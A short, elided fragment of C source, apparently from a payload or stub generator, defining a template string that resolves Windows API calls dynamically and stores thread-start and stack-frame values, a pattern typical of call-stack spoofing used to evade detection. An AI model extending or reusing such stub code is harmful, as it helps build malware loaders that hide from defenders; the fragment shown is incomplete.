...
const char *g_StubTemplate =
    ...
    "(PVOID)GetProcAddress(GetModuleHandleA(sK32), \"MapViewOfFile\");\n"
    "    Mask_File.pAddress = "
    "(PVOID)GetProcAddress(GetModuleHandleA(sK32), \"CreateFileW\");\n"
    "\n"
    "    qThreadBase = Mask_Worker.pAddress;\n"
    "    qRtlUserThreadStart = "
    ...
    "    \n"
    "    qThreadBaseFrame = Mask_Worker.dwFrameSize;\n"
